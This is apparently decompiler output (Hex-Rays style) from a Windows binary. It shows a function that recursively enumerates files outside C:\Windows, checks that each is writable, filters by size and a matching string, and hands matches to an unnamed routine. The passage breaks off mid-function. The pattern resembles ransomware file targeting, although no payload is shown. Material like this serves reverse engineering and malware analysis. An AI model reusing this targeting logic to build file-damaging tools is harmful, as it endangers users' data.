        unsigned int a20,
        _BYTE *a21,
        int a22,
        int a23,
        int a24,
        int a25,
        unsigned int a26)
{
  int v26; // ebx
  _DWORD *v27; // edi
  const WCHAR *v28; // eax
  int v29; // esi
  char *v30; // eax
  int v31; // eax
  LPCWSTR *v32; // ecx
  void *v33; // edx
  LPCWSTR *v34; // ecx
  void *v35; // edx
  LPCWSTR *v36; // ecx
  void *v37; // edx
  const wchar_t *v38; // eax
  FILE *v39; // eax
  WCHAR *v40; // eax
  __int64 v41; // kr00_8
  int v42; // ecx
  LPCWSTR *v43; // ecx
  void *v44; // edx
  _DWORD *v45; // eax
  int v46; // ecx
  LPCWSTR *v47; // ecx
  void *v48; // edx
  int v49; // ecx
  char *v50; // eax
  int v51; // ecx
  char v52; // bl
  LPCWSTR *v53; // ecx
  void *v54; // edx
  LPCWSTR *v55; // ecx
  void *v56; // edx
  int v57; // ecx
  HANDLE v58; // esi
  int v59; // edi
  int v60; // esi
  unsigned __int64 v61; // kr08_8
  LPCWSTR *v62; // ecx
  WCHAR *v63; // edx
  void *v64; // esi
  unsigned int v65; // ecx
  int v66; // edx
  _BYTE *v67; // ecx
  unsigned int v68; // edx
  _BYTE *v69; // ecx
  unsigned int v70; // edx
  _BYTE *v71; // ecx
  unsigned int v72; // edx
  _BYTE *v73; // ecx
  int result; // eax
  wchar_t *v75[6]; // [esp-80h] [ebp-414h] BYREF
  _BYTE *v76; // [esp-68h] [ebp-3FCh] BYREF
  int v77; // [esp-64h] [ebp-3F8h] BYREF
  int v78; // [esp-60h] [ebp-3F4h]
  int v79; // [esp-5Ch] [ebp-3F0h]
  int v80; // [esp-58h] [ebp-3ECh]
  unsigned int v81; // [esp-54h] [ebp-3E8h]
  _BYTE *v82; // [esp-50h] [ebp-3E4h] BYREF
  int v83; // [esp-4Ch] [ebp-3E0h] BYREF
  int v84; // [esp-48h] [ebp-3DCh]
  int v85; // [esp-44h] [ebp-3D8h]
  int v86; // [esp-40h] [ebp-3D4h]
  unsigned int v87; // [esp-3Ch] [ebp-3D0h]
  _BYTE *v88; // [esp-38h] [ebp-3CCh] BYREF
  int v89; // [esp-34h] [ebp-3C8h]
  int v90; // [esp-30h] [ebp-3C4h] BYREF
  int v91; // [esp-2Ch] [ebp-3C0h]
  int v92; // [esp-28h] [ebp-3BCh]
  unsigned int v93; // [esp-24h] [ebp-3B8h]
  int v94; // [esp-20h] [ebp-3B4h]
  int v95; // [esp-1Ch] [ebp-3B0h]
  _BYTE *v96; // [esp-18h] [ebp-3ACh] BYREF
  int v97; // [esp-14h] [ebp-3A8h]
  int v98; // [esp-10h] [ebp-3A4h]
  int v99; // [esp-Ch] [ebp-3A0h]
  int v100; // [esp-8h] [ebp-39Ch]
  LPCWSTR *v101; // [esp-4h] [ebp-398h]
  unsigned int v102; // [esp+0h] [ebp-394h] BYREF
  int v103[5]; // [esp+10h] [ebp-384h] BYREF
  unsigned int v104; // [esp+24h] [ebp-370h]
  int v105[5]; // [esp+28h] [ebp-36Ch] BYREF
  unsigned int v106; // [esp+3Ch] [ebp-358h]
  int v107[5]; // [esp+40h] [ebp-354h] BYREF
  unsigned int v108; // [esp+54h] [ebp-340h]
  int v109[5]; // [esp+58h] [ebp-33Ch] BYREF
  unsigned int v110; // [esp+6Ch] [ebp-328h]
  int v111[5]; // [esp+70h] [ebp-324h] BYREF
  unsigned int v112; // [esp+84h] [ebp-310h]
  _BYTE **v113; // [esp+90h] [ebp-304h]
  int v114[4]; // [esp+94h] [ebp-300h] BYREF
  int v115; // [esp+A4h] [ebp-2F0h]
  unsigned int v116; // [esp+A8h] [ebp-2ECh]
  wchar_t **v117; // [esp+ACh] [ebp-2E8h]
  int *v118; // [esp+B0h] [ebp-2E4h]
  int *v119; // [esp+B4h] [ebp-2E0h]
  int *v120; // [esp+B8h] [ebp-2DCh]
  HANDLE hFindFile; // [esp+BCh] [ebp-2D8h]
  int v122; // [esp+C0h] [ebp-2D4h]
  _DWORD *v123; // [esp+C4h] [ebp-2D0h]
  int v124; // [esp+C8h] [ebp-2CCh]
  struct _WIN32_FIND_DATAW FindFileData; // [esp+CCh] [ebp-2C8h] BYREF
  int v126[5]; // [esp+31Ch] [ebp-78h] BYREF
  unsigned int v127; // [esp+330h] [ebp-64h]
  unsigned int v128; // [esp+334h] [ebp-60h]
  LPCWSTR *v129; // [esp+338h] [ebp-5Ch]
  LPCWSTR *v130; // [esp+33Ch] [ebp-58h]
  LPCWSTR *v131; // [esp+340h] [ebp-54h]
  LPCWSTR *v132; // [esp+344h] [ebp-50h]
  LPCWSTR *v133; // [esp+348h] [ebp-4Ch]
  LPCWSTR *v134; // [esp+34Ch] [ebp-48h]
  LPCWSTR *v135; // [esp+350h] [ebp-44h]
  LPCWSTR *v136; // [esp+354h] [ebp-40h]
  int v137; // [esp+358h] [ebp-3Ch]
  LPCWSTR lpFileName[5]; // [esp+35Ch] [ebp-38h] BYREF
  unsigned int v139; // [esp+370h] [ebp-24h]
  unsigned __int64 v140; // [esp+374h] [ebp-20h] BYREF
  int v141; // [esp+37Ch] [ebp-18h]
  int *v142; // [esp+384h] [ebp-10h]
  int v143; // [esp+390h] [ebp-4h]
  int savedregs; // [esp+394h] [ebp+0h] BYREF

  v142 = (int *)&v102;
  v123 = a1;
  v122 = a14;
  v26 = 0;
  v124 = 0;
  v143 = 5;
  v140 = 0i64;
  v141 = 0;
  v27 = a1;
  sub_4229A0((int)lpFileName, a1, L"\\*");
  LOBYTE(v143) = 6;
  v28 = (const WCHAR *)lpFileName;
  if ( v139 >= 8 )
    v28 = lpFileName[0];
  hFindFile = FindFirstFileW(v28, &FindFileData);
  if ( hFindFile == (HANDLE)-1 )
    sub_422D50(byte_4F0290, "fuck");
  do
  {
    v29 = sub_4194E0((int)v107, FindFileData.cFileName);
    LOBYTE(v143) = 7;
    v30 = (char *)sub_4229A0((int)v109, v27, (unsigned __int16 *)"\\");
    LOBYTE(v143) = 8;
    v31 = sub_421BF0((int)v111, v30, v29);
    LOBYTE(v143) = 9;
    sub_419470((int)lpFileName, v31);
    LOBYTE(v143) = 8;
    if ( v112 >= 8 )
    {
      v32 = (LPCWSTR *)(2 * v112 + 2);
      v136 = v32;
      v33 = (void *)v111[0];
      if ( (unsigned int)v32 >= 0x1000 )
      {
        v32 = (LPCWSTR *)(2 * v112 + 37);
        v136 = v32;
        v33 = *(void **)(v111[0] - 4);
        if ( (unsigned int)(v111[0] - (_DWORD)v33 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v101 = v32;
      sub_46C87D(v33);
    }
    v111[4] = 0;
    v112 = 7;
    LOWORD(v111[0]) = 0;
    LOBYTE(v143) = 7;
    if ( v110 >= 8 )
    {
      v34 = (LPCWSTR *)(2 * v110 + 2);
      v135 = v34;
      v35 = (void *)v109[0];
      if ( (unsigned int)v34 >= 0x1000 )
      {
        v34 = (LPCWSTR *)(2 * v110 + 37);
        v135 = v34;
        v35 = *(void **)(v109[0] - 4);
        if ( (unsigned int)(v109[0] - (_DWORD)v35 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v101 = v34;
      sub_46C87D(v35);
    }
    v109[4] = 0;
    v110 = 7;
    LOWORD(v109[0]) = 0;
    LOBYTE(v143) = 6;
    if ( v108 >= 8 )
    {
      v36 = (LPCWSTR *)(2 * v108 + 2);
      v134 = v36;
      v37 = (void *)v107[0];
      if ( (unsigned int)v36 >= 0x1000 )
      {
        v36 = (LPCWSTR *)(2 * v108 + 37);
        v134 = v36;
        v37 = *(void **)(v107[0] - 4);
        if ( (unsigned int)(v107[0] - (_DWORD)v37 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v101 = v36;
      sub_46C87D(v37);
    }
    v107[4] = 0;
    v108 = 7;
    LOWORD(v107[0]) = 0;
    if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
    {
      if ( lstrcmpW(FindFileData.cFileName, ".")
        && lstrcmpW(FindFileData.cFileName, L"..")
        && sub_4191C0((char *)lpFileName, L"C:\\Windows", v57) == -1 )
      {
        v101 = lpFileName;
        if ( v141 == HIDWORD(v140) )
        {
          sub_423CD0((int *)&v140, SHIDWORD(v140), v101);
        }
        else
        {
          sub_419530((_DWORD *)HIDWORD(v140), v101);
          HIDWORD(v140) += 24;
        }
      }
    }
    else
    {
      LOBYTE(v143) = 10;
      v38 = (const wchar_t *)lpFileName;
      if ( v139 >= 8 )
        v38 = lpFileName[0];
      v39 = _wfopen(v38, L"r+b");
      if ( v39 )
      {
        fclose(v39);
        v40 = (WCHAR *)sub_421E60((int)v105, (unsigned int *)lpFileName, (int)v101);
        LOBYTE(v143) = 11;
        v41 = sub_404B60(v40);
        LOBYTE(v143) = 10;
        v42 = v106;
        if ( v106 >= 8 )
        {
          v43 = (LPCWSTR *)(2 * v106 + 2);
          v133 = v43;
          v44 = (void *)v105[0];
          if ( (unsigned int)v43 >= 0x1000 )
          {
            v43 = (LPCWSTR *)(2 * v106 + 37);
            v133 = v43;
            v44 = *(void **)(v105[0] - 4);
            if ( (unsigned int)(v105[0] - (_DWORD)v44 - 4) > 0x1F )
              _invalid_parameter_noinfo_noreturn();
          }
          v101 = v43;
          sub_46C87D(v44);
        }
        v105[4] = 0;
        v106 = 7;
        LOWORD(v105[0]) = 0;
        v45 = (_DWORD *)sub_421E60((int)v103, (unsigned int *)lpFileName, v42);
        LOBYTE(v143) = 13;
        sub_404120(v45, (int)v126);
        LOBYTE(v143) = 15;
        v46 = v104;
        if ( v104 >= 8 )
        {
          v47 = (LPCWSTR *)(2 * v104 + 2);
          v132 = v47;
          v48 = (void *)v103[0];
          if ( (unsigned int)v47 >= 0x1000 )
          {
            v47 = (LPCWSTR *)(2 * v104 + 37);
            v132 = v47;
            v48 = *(void **)(v103[0] - 4);
            if ( (unsigned int)(v103[0] - (_DWORD)v48 - 4) > 0x1F )
              _invalid_parameter_noinfo_noreturn();
          }
          v101 = v47;
          sub_46C87D(v48);
        }
        v103[4] = 0;
        v104 = 7;
        LOWORD(v103[0]) = 0;
        if ( (unsigned __int64)(v41 - 600300) > 0x61954 || sub_4191C0((char *)lpFileName, L"C:\\Windows", v46) != -1 )
          goto LABEL_37;
        sub_421E60((int)v114, (unsigned int *)&a21, v49);
        LOBYTE(v143) = 17;
        v124 = v26 | 1;
        v50 = (char *)v114;
        if ( v116 >= 8 )
          v50 = (char *)v114[0];
        if ( sub_403F60(v126, v50, v115) && sub_4191C0((char *)lpFileName, L"C:\\\\Windows\\", v51) == -1 )
          v52 = 1;
        else
LABEL_37:
          v52 = 0;
        v143 = 15;
        if ( (v124 & 1) != 0 )
        {
          v124 &= ~1u;
          LOBYTE(v143) = 15;
          if ( v116 >= 8 )
          {
            v53 = (LPCWSTR *)(2 * v116 + 2);
            v131 = v53;
            v54 = (void *)v114[0];
            if ( (unsigned int)v53 >= 0x1000 )
            {
              v53 = (LPCWSTR *)(2 * v116 + 37);
              v131 = v53;
              v54 = *(void **)(v114[0] - 4);
              if ( (unsigned int)(v114[0] - (_DWORD)v54 - 4) > 0x1F )
                _invalid_parameter_noinfo_noreturn();
            }
            v101 = v53;
            sub_46C87D(v54);
          }
          v115 = 0;
          v116 = 7;
          LOWORD(v114[0]) = 0;
        }
        if ( v52 )
        {
          v113 = &v96;
          sub_419530(&v96, &a21);
          LOBYTE(v143) = 19;
          v120 = (int *)&v88;
          sub_419530(&v88, &a8);
          LOBYTE(v143) = 20;
          v119 = (int *)&v82;
          sub_419530(&v82, &a15);
          LOBYTE(v143) = 21;
          v118 = (int *)&v76;
          sub_419BE0(&v76, &a2);
          LOBYTE(v143) = 22;
          v117 = v75;
          sub_419530(v75, lpFileName);
          LOBYTE(v143) = 15;
          sub_40AAB0(
            v122,
            (int)&savedregs,
            v75[0],
            (int)v75[1],
            (int)v75[2],
            (int)v75[3],
            (int)v75[4],
            (unsigned int)v75[5],
            v76,
            v77,
            v78,
            v79,
            v80,
            v81,
            v82,
            v83,
            v84,
            v85,
            v86,
            v87,
            v88,
            v89,
            v90,
            v91,
            v92,
            v93,
            v94,
            v95,
            v96,
            v97,
            v98,
            v99,
            v100,
            (unsigned int)v101);
        }
        LOBYTE(v143) = 10;
        if ( v127 >= 8 )
        {
          v55 = (LPCWSTR *)(2 * v127 + 2);
          v130 = v55;
          v56 = (void *)v126[0];
          if ( (unsigned int)v55 >= 0x1000 )
          {
            v55 = (LPCWSTR *)(2 * v127 + 37);
            v130 = v55;
            v56 = *(void **)(v126[0] - 4);
            if ( (unsigned int)(v126[0] - (_DWORD)v56 - 4) > 0x1F )
              _invalid_parameter_noinfo_noreturn();
          }
          v101 = v55;
          sub_46C87D(v56);
        }
        v126[4] = 0;
        v127 = 7;
        LOWORD(v126[0]) = 0;
        v143 = 6;
        v26 = v124;
        v27 = v123;
      }
      else
      {
        LOBYTE(v143) = 6;
      }
    }
    v58 = hFindFile;
  }
  while ( FindNextFileW(hFindFile, &FindFileData) );
  FindClose(v58);
  v61 = v140;
  v59 = HIDWORD(v61);
  v60 = v61;
  v137 = v140;
  while ( v60 != v59 )
  {
    v117 = (wchar_t **)&v96;
    sub_419530(&v96, &a21);
    LOBYTE(v143) = 26;
    v118 = &v90;
    sub_419530(&v90, &a15);
    LOBYTE(v143) = 27;
    v89 = v122;
    v119 = &v83;
    sub_419530(&v83, &a8);
    LOBYTE(v143) = 28;
    v120 = &v77;
    sub_419BE0(&v77, &a2);
    LOBYTE(v143) = 6;
    sub_40E040(
      v60,
      v77,
      v78,
      v79,
      v80,
      v81,
      v82,
      v83,
      v84,
      v85,
      v86,
      v87,
      v88,
      v89,
      v90,
      v91,
      v92,
      v93,
      v94,
      v95,
      v96,
      v97,
      v98,
      v99,
      v100,
      v101);
    v60 += 24;
    v137 = v60;
  }
  LOBYTE(v143) = 5;
  if ( v139 >= 8 )
  {
    v62 = (LPCWSTR *)(2 * v139 + 2);
    v129 = v62;
    v63 = (WCHAR *)lpFileName[0];
    if ( (unsigned int)v62 >= 0x1000 )
    {
      v62 = (LPCWSTR *)(2 * v139 + 37);
      v129 = v62;
      v63 = (WCHAR *)*((_DWORD *)lpFileName[0] - 1);
      if ( (unsigned int)((char *)lpFileName[0] - (char *)v63 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v101 = v62;
    sub_46C87D(v63);
  }
  lpFileName[4] = 0;
  v139 = 7;
  LOWORD(lpFileName[0]) = 0;
  LOBYTE(v143) = 4;
  if ( (_DWORD)v140 )
  {
    v101 = (LPCWSTR *)v140;
    sub_425130(v140, SHIDWORD(v140));
    v64 = (void *)v140;
    v65 = 24 * ((v141 - (int)v140) / 24);
    v128 = v65;
    if ( v65 >= 0x1000 )
    {
      v65 += 35;
      v128 = v65;
      v64 = *(void **)(v140 - 4);
      if ( (unsigned int)(v140 - (_DWORD)v64 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v101 = (LPCWSTR *)v65;
    sub_46C87D(v64);
    v140 = 0i64;
    v141 = 0;
  }
  v143 = 2;
  if ( a7 >= 0x10 )
  {
    v66 = a7 + 1;
    v67 = a2;
    if ( a7 + 1 >= 0x1000 )
    {
      v66 = a7 + 36;
      v67 = (_BYTE *)*((_DWORD *)a2 - 1);
      if ( (unsigned int)(a2 - v67 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v102 = v66;
    sub_46C87D(v67);
  }
  a6 = 0;
  a7 = 15;
  LOBYTE(a2) = 0;
  LOBYTE(v143) = 1;
  if ( a13 >= 8 )
  {
    v68 = 2 * a13 + 2;
    v69 = a8;
    if ( v68 >= 0x1000 )
    {
      v68 = 2 * a13 + 37;
      v69 = (_BYTE *)*((_DWORD *)a8 - 1);
      if ( (unsigned int)(a8 - v69 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v102 = v68;
    sub_46C87D(v69);
  }
  a12 = 0;
  a13 = 7;
  LOWORD(a8) = 0;
  LOBYTE(v143) = 0;
  if ( a20 >= 8 )
  {
    v70 = 2 * a20 + 2;
    v71 = a15;
    if ( v70 >= 0x1000 )
    {
      v70 = 2 * a20 + 37;
      v71 = (_BYTE *)*((_DWORD *)a15 - 1);
      if ( (unsigned int)(a15 - v71 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v102 = v70;
    sub_46C87D(v71);
  }
  a19 = 0;
  a20 = 7;
  LOWORD(a15) = 0;
  v143 = -1;
  if ( a26 >= 8 )
  {
    v72 = 2 * a26 + 2;
    v73 = a21;
    if ( v72 >= 0x1000 )
    {
      v72 = 2 * a26 + 37;
      v73 = (_BYTE *)*((_DWORD *)a21 - 1);
      if ( (unsigned int)(a21 - v73 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v102 = v72;
    sub_46C87D(v73);
  }
  a25 = 0;
  a26 = 7;
  result = 0;
  LOWORD(a21) = 0;
  return result;
}
// 40E353: variable 'v42' is possibly undefined
// 40E3F2: variable 'v46' is possibly undefined
// 40E407: variable 'v49' is possibly undefined
// 40E44A: variable 'v51' is possibly undefined
// 40E638: variable 'v57' is possibly undefined
// 4CD0C0: using guessed type wchar_t aCWindows[11];
// 4CD0D8: using guessed type wchar_t aCWindows_0[13];
// 4CD168: using guessed type wchar_t asc_4CD168[3];

//----- (0040E9E0) --------------------------------------------------------
int __cdecl sub_40E9E0(
        _DWORD *a1,
        _BYTE *a2,
        int a3,
        int a4,
        int a5,
        int a6,
        unsigned int a7,
        _BYTE *a8,
        int a9,
        int a10,
        int a11,
        int a12,
        unsigned int a13,
        int a14,
        _BYTE *a15,
        int a16,
        int a17,
        int a18,
        int a19,
        unsigned int a20,
        _BYTE *a21,
        int a22,
        int a23,
        int a24,
        int a25,
        unsigned int a26)
{
  int v26; // edi
  const WCHAR *v27; // eax
  HANDLE v28; // ebx
  int v29; // esi
  char *v30; // eax
  int v31; // eax
  LPCWSTR *v32; // ecx
  void *v33; // edx
  LPCWSTR *v34; // ecx
  void *v35; // edx
  LPCWSTR *v36; // ecx
  void *v37; // edx
  const wchar_t *v38; // eax
  FILE *v39; // eax
  WCHAR *v40; // eax
  bool v41; // bl
  int v42; // ecx
  LPCWSTR *v43; // ecx
  void *v44; // edx
  WCHAR *v45; // eax
  LPCWSTR *v46; // ecx
  void *v47; // edx
  _DWORD *v48; // eax
  LPCWSTR *v49; // ecx
  void *v50; // edx
  char *v51; // eax
  int v52; // ecx
  int v53; // ecx
  char v54; // bl
  LPCWSTR *v55; // ecx
  void *v56; // edx
  LPCWSTR *v57; // ecx
  void *v58; // edx
  int v59; // ecx
  int v60; // edi
  int v61; // esi
  unsigned __int64 v62; // kr00_8
  LPCWSTR *v63; // ecx
  WCHAR *v64; // edx
  void *v65; // esi
  unsigned int v66; // ecx
  int v67; // edx
  _BYTE *v68; // ecx
  unsigned int v69; // edx
  _BYTE *v70; // ecx
  unsigned int v71; // edx
  _BYTE *v72; // ecx
  unsigned int v73; // edx
  _BYTE *v74; // ecx
  int result; // eax
  wchar_t *v76[6]; // [esp-80h] [ebp-438h] BYREF
  _BYTE *v77; // [esp-68h] [ebp-420h] BYREF
  int v78; // [esp-64h] [ebp-41Ch] BYREF
  int v79; // [esp-60h] [ebp-418h]
  int v80; // [esp-5Ch] [ebp-414h]
  int v81; // [esp-58h] [ebp-410h]
  unsigned int v82; // [esp-54h] [ebp-40Ch]
  _BYTE *v83; // [esp-50h] [ebp-408h] BYREF
  int v84; // [esp-4Ch] [ebp-404h] BYREF
  int v85; // [esp-48h] [ebp-400h]
  int v86; // [esp-44h] [ebp-3FCh]
  int v87; // [esp-40h] [ebp-3F8h]
  unsigned int v88; // [esp-3Ch] [ebp-3F4h]
  _BYTE *v89; // [esp-38h] [ebp-3F0h] BYREF
  int v90; // [esp-34h] [ebp-3ECh]
  int v91; // [esp-30h] [ebp-3E8h] BYREF
  int v92; // [esp-2Ch] [ebp-3E4h]
  int v93; // [esp-28h] [ebp-3E0h]
  unsigned int v94; // [esp-24h] [ebp-3DCh]
  int v95; // [esp-20h] [ebp-3D8h]
  int v96; // [esp-1Ch] [ebp-3D4h]
  _BYTE *v97; // [esp-18h] [ebp-3D0h] BYREF
  int v98; // [esp-14h] [ebp-3CCh]
  int v99; // [esp-10h] [ebp-3C8h]
  int v100; // [esp-Ch] [ebp-3C4h]
  int v101; // [esp-8h] [ebp-3C0h]
  LPCWSTR *v102; // [esp-4h] [ebp-3BCh]
  unsigned int v103; // [esp+0h] [ebp-3B8h] BYREF
  int v104[5]; // [esp+10h] [ebp-3A8h] BYREF
  unsigned int v105; // [esp+24h] [ebp-394h]
  int v106[5]; // [esp+28h] [ebp-390h] BYREF
  unsigned int v107; // [esp+3Ch] [ebp-37Ch]
  int v108[5]; // [esp+40h] [ebp-378h] BYREF
  unsigned int v109; // [esp+54h] [ebp-364h]
  int v110[5]; // [esp+58h] [ebp-360h] BYREF
  unsigned int v111; // [esp+6Ch] [ebp-34Ch]
  int v112[5]; // [esp+70h] [ebp-348h] BYREF
  unsigned int v113; // [esp+84h] [ebp-334h]
  int v114[5]; // [esp+88h] [ebp-330h] BYREF
  unsigned int v115; // [esp+9Ch] [ebp-31Ch]
  _BYTE **v116; // [esp+A0h] [ebp-318h]
  int v117[4]; // [esp+ACh] [ebp-30Ch] BYREF
  int v118; // [esp+BCh] [ebp-2FCh]
  unsigned int v119; // [esp+C0h] [ebp-2F8h]
  int *v120; // [esp+C4h] [ebp-2F4h]
  int *v121; // [esp+C8h] [ebp-2F0h]
  __int64 v122; // [esp+CCh] [ebp-2ECh]
  wchar_t **v123; // [esp+D4h] [ebp-2E4h]
  int *v124; // [esp+D8h] [ebp-2E0h]
  _DWORD *v125; // [esp+DCh] [ebp-2DCh]
  int v126; // [esp+E0h] [ebp-2D8h]
  int v127; // [esp+E4h] [ebp-2D4h]
  HANDLE hFindFile; // [esp+E8h] [ebp-2D0h]
  struct _WIN32_FIND_DATAW FindFileData; // [esp+ECh] [ebp-2CCh] BYREF
  int v130[5]; // [esp+33Ch] [ebp-7Ch] BYREF
  unsigned int v131; // [esp+350h] [ebp-68h]
  unsigned int v132; // [esp+354h] [ebp-64h]
  LPCWSTR *v133; // [esp+358h] [ebp-60h]
  LPCWSTR *v134; // [esp+35Ch] [ebp-5Ch]
  LPCWSTR *v135; // [esp+360h] [ebp-58h]
  LPCWSTR *v136; // [esp+364h] [ebp-54h]
  LPCWSTR *v137; // [esp+368h] [ebp-50h]
  LPCWSTR *v138; // [esp+36Ch] [ebp-4Ch]
  LPCWSTR *v139; // [esp+370h] [ebp-48h]
  LPCWSTR *v140; // [esp+374h] [ebp-44h]
  LPCWSTR *v141; // [esp+378h] [ebp-40h]
  int v142; // [esp+37Ch] [ebp-3Ch]
  LPCWSTR lpFileName[5]; // [esp+380h] [ebp-38h] BYREF
  unsigned int v144; // [esp+394h] [ebp-24h]
  unsigned __int64 v145; // [esp+398h] [ebp-20h] BYREF
  int v146; // [esp+3A0h] [ebp-18h]
  int *v147; // [esp+3A8h] [ebp-10h]
  int v148; // [esp+3B4h] [ebp-4h]
  int savedregs; // [esp+3B8h] [ebp+0h] BYREF

  v147 = (int *)&v103;
  v125 = a1;
  v126 = a14;
  v26 = 0;
  v127 = 0;
  v148 = 5;
  v145 = 0i64;
  v146 = 0;
  sub_4229A0((int)lpFileName, a1, L"\\*");
  LOBYTE(v148) = 6;
  v27 = (const WCHAR *)lpFileName;
  if ( v144 >= 8 )
    v27 = lpFileName[0];
  hFindFile = FindFirstFileW(v27, &FindFileData);
  if ( hFindFile == (HANDLE)-1 )
    sub_422D50(byte_4F0290, "fuck");
  v28 = hFindFile;
  do
  {
    v29 = sub_4194E0((int)v110, FindFileData.cFileName);
    LOBYTE(v148) = 7;
    v30 = (char *)sub_4229A0((int)v112, v125, (unsigned __int16 *)"\\");
    LOBYTE(v148) = 8;
    v31 = sub_421BF0((int)v114, v30, v29);
    LOBYTE(v148) = 9;
    sub_419470((int)lpFileName, v31);
    LOBYTE(v148) = 8;
    if ( v115 >= 8 )
    {
      v32 = (LPCWSTR *)(2 * v115 + 2);
      v141 = v32;
      v33 = (void *)v114[0];
      if ( (unsigned int)v32 >= 0x1000 )
      {
        v32 = (LPCWSTR *)(2 * v115 + 37);
        v141 = v32;
        v33 = *(void **)(v114[0] - 4);
        if ( (unsigned int)(v114[0] - (_DWORD)v33 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v102 = v32;
      sub_46C87D(v33);
    }
    v114[4] = 0;
    v115 = 7;
    LOWORD(v114[0]) = 0;
    LOBYTE(v148) = 7;
    if ( v113 >= 8 )
    {
      v34 = (LPCWSTR *)(2 * v113 + 2);
      v140 = v34;
      v35 = (void *)v112[0];
      if ( (unsigned int)v34 >= 0x1000 )
      {
        v34 = (LPCWSTR *)(2 * v113 + 37);
        v140 = v34;
        v35 = *(void **)(v112[0] - 4);
        if ( (unsigned int)(v112[0] - (_DWORD)v35 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v102 = v34;
      sub_46C87D(v35);
    }
    v112[4] = 0;
    v113 = 7;
    LOWORD(v112[0]) = 0;
    LOBYTE(v148) = 6;
    if ( v111 >= 8 )
    {
      v36 = (LPCWSTR *)(2 * v111 + 2);
      v139 = v36;
      v37 = (void *)v110[0];
      if ( (unsigned int)v36 >= 0x1000 )
      {
        v36 = (LPCWSTR *)(2 * v111 + 37);
        v139 = v36;
        v37 = *(void **)(v110[0] - 4);
        if ( (unsigned int)(v110[0] - (_DWORD)v37 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v102 = v36;
      sub_46C87D(v37);
    }
    v110[4] = 0;
    v111 = 7;
    LOWORD(v110[0]) = 0;
    if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
    {
      if ( lstrcmpW(FindFileData.cFileName, ".")
        && lstrcmpW(FindFileData.cFileName, L"..")
        && sub_4191C0((char *)lpFileName, L"C:\\Windows", v59) == -1 )
      {
        v102 = lpFileName;
        if ( v146 == HIDWORD(v145) )
        {
          sub_423CD0((int *)&v145, SHIDWORD(v145), v102);
        }
        else
        {
          sub_419530((_DWORD *)HIDWORD(v145), v102);
          HIDWORD(v145) += 24;
        }
      }
    }
    else
    {
      LOBYTE(v148) = 10;
      v38 = (const wchar_t *)lpFileName;
      if ( v144 >= 8 )
        v38 = lpFileName[0];
      v39 = _wfopen(v38, L"r+b");
      if ( !v39 )
      {
        LOBYTE(v148) = 6;
        continue;
      }
      fclose(v39);
      v40 = (WCHAR *)sub_421E60((int)v108, (unsigned int *)lpFileName, (int)v102);
      LOBYTE(v148) = 11;
      v41 = sub_404BC0(v40);
      LOBYTE(v148) = 10;
      v42 = v109;
      if ( v109 >= 8 )
      {
        v43 = (LPCWSTR *)(2 * v109 + 2);
        v138 = v43;
        v44 = (void *)v108[0];
        if ( (unsigned int)v43 >= 0x1000 )
        {
          v43 = (LPCWSTR *)(2 * v109 + 37);
          v138 = v43;
          v44 = *(void **)(v108[0] - 4);
          if ( (unsigned int)(v108[0] - (_DWORD)v44 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        v102 = v43;
        sub_46C87D(v44);
      }
      v108[4] = 0;
      v109 = 7;
      LOWORD(v108[0]) = 0;
      if ( v41 )
      {
        v45 = (WCHAR *)sub_421E60((int)v106, (unsigned int *)lpFileName, v42);
        LOBYTE(v148) = 13;
        v122 = sub_404B60(v45);
        LOBYTE(v148) = 10;
        v42 = v107;
        if ( v107 >= 8 )
        {
          v46 = (LPCWSTR *)(2 * v107 + 2);
          v137 = v46;
          v47 = (void *)v106[0];
          if ( (unsigned int)v46 >= 0x1000 )
          {
            v46 = (LPCWSTR *)(2 * v107 + 37);
            v137 = v46;
            v47 = *(void **)(v106[0] - 4);
            if ( (unsigned int)(v106[0] - (_DWORD)v47 - 4) > 0x1F )
              _invalid_parameter_noinfo_noreturn();
          }
          v102 = v46;
          sub_46C87D(v47);
        }
        v106[4] = 0;
        v107 = 7;
        LOWORD(v106[0]) = 0;
      }
      v48 = (_DWORD *)sub_421E60((int)v104, (unsigned int *)lpFileName, v42);
      LOBYTE(v148) = 15;
      sub_404120(v48, (int)v130);
      LOBYTE(v148) = 17;
      if ( v105 >= 8 )
      {
        v49 = (LPCWSTR *)(2 * v105 + 2);
        v136 = v49;
        v50 = (void *)v104[0];
        if ( (unsigned int)v49 >= 0x1000 )
        {
          v49 = (LPCWSTR *)(2 * v105 + 37);
          v136 = v49;
          v50 = *(void **)(v104[0] - 4);
          if ( (unsigned int)(v104[0] - (_DWORD)v50 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        v102 = v49;
        sub_46C87D(v50);
      }
      v104[4] = 0;
      v105 = 7;
      LOWORD(v104[0]) = 0;
      if ( (unsigned __int64)(v122 - 1000301) > 0x3D07D3 )
        goto LABEL_44;
      sub_421E60((int)v117, (unsigned int *)&a21, v122 - 1000301);
      LOBYTE(v148) = 19;
      v127 = v26 | 1;
      v51 = (char *)v117;
      if ( v119 >= 8 )
        v51 = (char *)v117[0];
      if ( sub_403F60(v130, v51, v118)
        && sub_4191C0((char *)lpFileName, L"C:\\Windows", v52) == -1
        && sub_4191C0((char *)lpFileName, L"C:\\\\Windows\\", v53) == -1 )
      {
        v54 = 1;
      }
      else
      {
LABEL_44:
        v54 = 0;
      }
      v148 = 17;
      if ( (v127 & 1) != 0 )
      {
        v127 &= ~1u;
        LOBYTE(v148) = 17;
        if ( v119 >= 8 )
        {
          v55 = (LPCWSTR *)(2 * v119 + 2);
          v135 = v55;
          v56 = (void *)v117[0];
          if ( (unsigned int)v55 >= 0x1000 )
          {
